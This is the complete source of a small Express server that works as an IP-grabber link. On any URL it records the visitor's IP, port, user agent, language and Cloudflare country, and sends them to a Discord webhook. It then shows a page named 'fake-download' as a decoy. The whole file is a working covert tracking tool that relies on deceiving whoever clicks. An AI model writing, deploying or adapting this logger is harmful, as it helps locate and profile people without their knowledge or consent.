// Import express
const express = require('express');
const path = require('path');

// Define the instance
const app = express();
const port = process.env.PORT || 3000;

const isCloudflareEnabled = process.env.CLOUDFLARE === 'true';
const discordWebhook = process.env.DISCORD_WEBHOOK;

// Lisen on every routes
app.get('*', async (req, res) => {
    // "Grab" the user informations
    const clientInfo = {
        QUERY_STRING: req.originalUrl || '',
        HTTP_X_FORWARDED_FOR: req.headers['cf-connecting-ip'] || req.socket.remoteAddress || '',
        HTTP_USER_AGENT: req.get('User-Agent') || '',
        HTTP_ACCEPT: req.get('Accept') || '',
        HTTP_ACCEPT_LANGUAGE: req.get('Accept-Language') || '',
        ...(isCloudflareEnabled && {
            HTTP_CF_CONNECTING_IP: req.headers['cf-connecting-ip'] || '',
            HTTP_CF_IPCOUNTRY: req.headers['cf-ipcountry'] || '',
        }),
        REMOTE_ADDRESS: req.socket.remoteAddress.toString() || '',
        REMOTE_PORT: req.socket.remotePort.toString() || ''
    };

    // Log in docker logs...
    console.log("[INFO] Someone clicked");
    console.log(clientInfo);

    const clientInfoJSON = JSON.stringify(clientInfo, null, 2);

    try {
        const response = await fetch(discordWebhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content: `Someone clicked !\n\`\`\`${clientInfoJSON}\`\`\`` }),
        });

        if (response.ok) {
            console.log('Data successfully sent to Discord webhook.');
        } else {
            console.error('Error sending data to Discord webhook: ', response.statusText);
        }
    } catch (error) {
        console.error('An error occurred while sending data to the Discord webhook: ', error.message);
    }

    res.render('fake-download');
});

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, './view'));

// Start server
app.listen(port, () => {
    console.log(`Express server running on port ${port}`);
});
